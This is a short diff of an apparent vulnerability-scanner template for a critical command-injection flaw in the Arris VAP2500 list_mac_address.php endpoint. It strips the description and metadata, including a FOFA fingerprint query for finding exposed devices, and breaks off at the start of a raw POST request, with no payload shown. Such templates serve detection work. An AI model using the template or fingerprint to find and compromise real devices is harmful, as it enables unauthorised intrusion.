@@ -3,12 +3,8 @@ info:
   name: Arris VAP2500 list_mac_address.php 命令注入漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nrhwgy0ftdm6ourw'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: nrhwgy0ftdm6ourw
-    fofa: body="CACHE-CONTROL" && body="/js/cookiecontrol.js"
 http:
 - raw:
   - 'POST /list_mac_address.php HTTP/1.1
